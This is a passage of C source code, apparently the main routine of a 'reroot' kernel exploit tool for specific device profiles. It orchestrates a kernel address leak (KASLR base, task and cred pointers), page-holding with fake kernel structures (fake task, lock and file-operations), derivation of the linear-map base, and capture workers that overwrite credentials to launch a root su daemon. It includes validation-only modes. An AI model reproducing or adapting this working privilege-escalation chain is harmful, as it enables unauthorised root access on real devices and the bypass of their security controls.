    fprintf(stderr, "[reroot] hold times must be at least 60 seconds\n");
    return 2;
  }
  if ((validate_only && chain_validate_only) ||
      (preflight_only && (validate_only || chain_validate_only))) {
    fprintf(stderr, "[reroot] validation modes are mutually exclusive\n");
    return 2;
  }

  setvbuf(stdout, NULL, _IOLBF, 0);
  setvbuf(stderr, NULL, _IOLBF, 0);
  signal(SIGINT, on_signal);
  signal(SIGTERM, on_signal);
  signal(SIGHUP, on_signal);

  char boot_id[128] = "unknown";
  read_first_line("/proc/sys/kernel/random/boot_id", boot_id, sizeof(boot_id));
  printf("[reroot] START boot_id=%s pid=%d uid=%d gid=%d pure_c=1\n", boot_id,
         getpid(), getuid(), getgid());

  if (!force && !preflight_only && !validate_only && !chain_validate_only &&
      existing_root_works()) {
    printf("[reroot] SUCCESS already_root=1 boot_id=%s\n", boot_id);
    return 0;
  }
  if (!target_profile_matches()) {
    fprintf(stderr, "[reroot] refusing unsupported kernel/device profile\n");
    return 1;
  }
  if (preflight_only) {
    printf("[reroot] PREFLIGHT_OK boot_id=%s\n", boot_id);
    return 0;
  }
#if !IONSTACK_PROFILE_VALIDATE_ENABLED
  fprintf(stderr,
          "[reroot] refusing validate/full run: profile %s has no enabled "
          "validation path\n",
          IONSTACK_PROFILE_NAME);
  return 1;
#endif
#if !IONSTACK_PROFILE_CHAIN_VALIDATED
  if (!validate_only && !chain_validate_only) {
    fprintf(stderr,
            "[reroot] refusing full run: profile %s has not passed dynamic "
            "chain validation yet\n",
            IONSTACK_PROFILE_NAME);
    return 1;
  }
#endif
  if (!all_required_files_present()) {
    return 1;
  }

  struct child_proc target;
  struct child_proc holder;
  struct child_proc captures[CAPTURE_WORKERS];
  struct child_proc probe;
  child_init(&target);
  child_init(&holder);
  for (size_t i = 0; i < CAPTURE_WORKERS; ++i) {
    child_init(&captures[i]);
  }
  child_init(&probe);
  struct target_state target_state;
  memset(&target_state, 0, sizeof(target_state));
  int result = 1;

  if (spawn_target(&target, target_hold_sec) != 0) {
    perror("[reroot] spawn target");
    goto cleanup;
  }
  if (wait_for_child_condition(&target, TARGET_READY_TIMEOUT_MS, target_line,
                               &target_state, &target_state.ready) != 0) {
    fprintf(stderr, "[reroot] target leak did not become ready\n");
    goto cleanup;
  }
  printf("[reroot] LEAK_OK kaslr_base=0x%016" PRIx64
         " task=0x%016" PRIx64 " cred=0x%016" PRIx64
         " cred_hits=%u base_hits=%u\n",
         target_state.kaslr_base, target_state.task, target_state.cred,
         target_state.cred_hits, target_state.base_hits);

  struct helper_state helper_state;
  memset(&helper_state, 0, sizeof(helper_state));
  int helper_ok = 0;
  for (unsigned attempt = 1; attempt <= HELPER_ATTEMPTS; ++attempt) {
    printf("[reroot] HOLDER attempt=%u/%u\n", attempt, HELPER_ATTEMPTS);
    memset(&helper_state, 0, sizeof(helper_state));
    if (spawn_holder(&holder, target_state.kaslr_base, page_hold_sec,
                     attempt) != 0) {
      perror("[reroot] spawn holder");
      goto cleanup;
    }
    int wait_rc = wait_for_child_condition(
        &holder, HELPER_TIMEOUT_MS, helper_line, &helper_state,
        &helper_state.hold_ready);
    int fresh_base_ok =
        helper_state.hold_ready &&
        ((helper_state.fresh_candidate & ~UINT64_C(0x7fff)) ==
             helper_state.hold_base ||
         (helper_state.fresh_candidate & ~UINT64_C(0xfff)) ==
             helper_state.hold_base);
    int layout_ok =
        helper_state.hold_ready &&
        helper_state.fake_lock >= helper_state.hold_base &&
        helper_state.fake_lock < helper_state.hold_base + UINT64_C(0x8000) &&
        helper_state.fake_w0 >= helper_state.hold_base &&
        helper_state.fake_w0 < helper_state.hold_base + UINT64_C(0x8000) &&
        helper_state.fake_task >= helper_state.hold_base &&
        helper_state.fake_task < helper_state.hold_base + UINT64_C(0x8000) &&
        helper_state.fake_fops >= helper_state.hold_base &&
        helper_state.fake_fops < helper_state.hold_base + UINT64_C(0x8000);
    helper_ok = wait_rc == 0 && helper_state.fresh_ok && fresh_base_ok &&
                layout_ok &&
                helper_state.order_ok && helper_state.pfn_ok &&
                helper_state.content_ok && helper_state.hold_ready;
    if (helper_ok) {
      break;
    }
    fprintf(stderr,
            "[reroot] HOLDER_REJECT fresh=%d order=%d pfn=%d content=%d "
            "hold=%d fresh_base=%d layout=%d matches=%u/%u "
            "next_partial_slabs=%u next_posttarget_sends=%u\n",
            helper_state.fresh_ok, helper_state.order_ok, helper_state.pfn_ok,
            helper_state.content_ok, helper_state.hold_ready,
            fresh_base_ok, layout_ok,
            helper_state.fresh_matches, helper_state.fresh_wanted,
#if defined(IONSTACK_PROFILE_XPAD3S)
            8U + attempt * 2U, 8192U + attempt * 1024U);
#else
            18U + attempt * 2U, 8192U + attempt * 1024U);
#endif
    stop_child(&holder);
    child_init(&holder);
  }
  if (!helper_ok) {
    fprintf(stderr, "[reroot] holder attempts exhausted\n");
    goto cleanup;
  }

  uint64_t pfn_address = helper_state.target_pfn << 12;
  if (helper_state.hold_base < pfn_address) {
    fprintf(stderr, "[reroot] invalid direct-map derivation\n");
    goto cleanup;
  }
  uint64_t linear_map_base = helper_state.hold_base - pfn_address;
  if ((linear_map_base & 0xfffU) != 0 ||
      (linear_map_base >> 40) != UINT64_C(0xffffff)) {
    fprintf(stderr, "[reroot] invalid linear-map base=0x%016" PRIx64 "\n",
            linear_map_base);
    goto cleanup;
  }
  printf("[reroot] HOLDER_OK base=0x%016" PRIx64
         " fake_task=0x%016" PRIx64 " fake_lock=0x%016" PRIx64
         " fake_w0=0x%016" PRIx64
         " fake_fops=0x%016" PRIx64 " target_pfn=0x%" PRIx64
         " linear_map_base=0x%016" PRIx64 "\n",
         helper_state.hold_base, helper_state.fake_task,
         helper_state.fake_lock, helper_state.fake_w0, helper_state.fake_fops,
         helper_state.target_pfn, linear_map_base);

  if (validate_only) {
    printf("[reroot] VALIDATION_OK boot_id=%s kaslr_base=0x%016" PRIx64
           " cred=0x%016" PRIx64 " linear_map_base=0x%016" PRIx64 "\n",
           boot_id, target_state.kaslr_base, target_state.cred,
           linear_map_base);
    result = 0;
    goto cleanup;
  }

  struct capture_state capture_states[CAPTURE_WORKERS];
  memset(capture_states, 0, sizeof(capture_states));
  for (unsigned i = 0; i < CAPTURE_WORKERS; ++i) {
    if (spawn_capture(&captures[i], i, &target_state, &helper_state,
                      linear_map_base, chain_validate_only) != 0) {
      perror("[reroot] spawn capture worker");
      goto cleanup;
    }
    printf("[reroot] CAPTURE_WORKER index=%u pid=%d mode=%s\n", i,
           captures[i].pid,
           chain_validate_only ? "check-restore" : "cred-writeonly");
  }
  sleep_ms(500);
  if (spawn_probe(&probe, &target_state, &helper_state) != 0) {
    perror("[reroot] spawn probe");
    goto cleanup;
  }
  printf("[reroot] TRIGGER capture_workers=%u probe_pid=%d\n",
         CAPTURE_WORKERS, probe.pid);

  if (wait_captures_and_probe(captures, capture_states, CAPTURE_WORKERS,
                              &probe) != 0) {
    fprintf(stderr, "[reroot] capture/probe timeout\n");
    goto cleanup;
  }
  int probe_rc = child_exit_code(&probe);
  unsigned capture_results = 0;
  unsigned capture_successes = 0;
  unsigned capture_su_ready = 0;
  for (size_t i = 0; i < CAPTURE_WORKERS; ++i) {
    capture_results += capture_states[i].saw_result ? 1U : 0U;
    capture_successes += capture_states[i].saw_result &&
                                 capture_states[i].ok &&
                                 capture_states[i].restore_ok
                             ? 1U
                             : 0U;
    capture_su_ready += capture_states[i].su_ready ? 1U : 0U;
  }
  printf("[reroot] TRIGGER_DONE workers=%u results=%u successes=%u "
         "su_ready=%u probe_rc=%d\n",
         CAPTURE_WORKERS, capture_results, capture_successes,
         capture_su_ready, probe_rc);
  if (probe_rc != 0 || capture_successes == 0) {
    fprintf(stderr, "[reroot] %s capture failed\n",
            chain_validate_only ? "check-and-restore" : "write-only root");
    goto cleanup;
  }

  if (chain_validate_only) {
    char enforce[32] = {0};
    char current_boot_id[128] = "unknown";
    int enforce_ok = read_first_line("/sys/fs/selinux/enforce", enforce,
                                     sizeof(enforce)) == 0 &&
                     strcmp(enforce, "1") == 0;
    int boot_ok = read_first_line("/proc/sys/kernel/random/boot_id",
                                  current_boot_id,
                                  sizeof(current_boot_id)) == 0 &&
                  strcmp(current_boot_id, boot_id) == 0;
    if (!enforce_ok || !boot_ok) {
      fprintf(stderr,
              "[reroot] chain validation postcondition failed "
              "enforce=%s boot_id=%s\n",
              enforce, current_boot_id);
      goto cleanup;
    }
    printf("[reroot] CHAIN_VALIDATION_OK boot_id=%s kaslr_base=0x%016" PRIx64
           " fake_fops=0x%016" PRIx64 " restores=%u enforce=%s\n",
           boot_id, target_state.kaslr_base, helper_state.fake_fops,
           capture_successes, enforce);
    result = 0;
    goto cleanup;
  }

  for (size_t i = 0; i < CAPTURE_WORKERS; ++i) {
    stop_child(&captures[i]);
  }

  if (!target_state.root_ready) {
    if (wait_for_child_condition(&target, ROOT_READY_TIMEOUT_MS, target_line,
                                 &target_state,
                                 &target_state.root_ready) != 0) {
      fprintf(stderr, "[reroot] target did not launch root daemon\n");
      goto cleanup;
    }
  }
  if (!existing_root_works()) {
    fprintf(stderr, "[reroot] independent su verification failed\n");
    goto cleanup;
  }

  printf("[reroot] SUCCESS boot_id=%s kaslr_base=0x%016" PRIx64
         " cred=0x%016" PRIx64 " linear_map_base=0x%016" PRIx64 "\n",
         boot_id, target_state.kaslr_base, target_state.cred,
         linear_map_base);
  result = 0;

cleanup:
  stop_child(&probe);
  for (size_t i = 0; i < CAPTURE_WORKERS; ++i) {
    stop_child(&captures[i]);
  }
  stop_child(&holder);
  stop_child(&target);
  if (result != 0) {
    fprintf(stderr, "[reroot] FAIL boot_id=%s\n", boot_id);
  }
  return result;
}
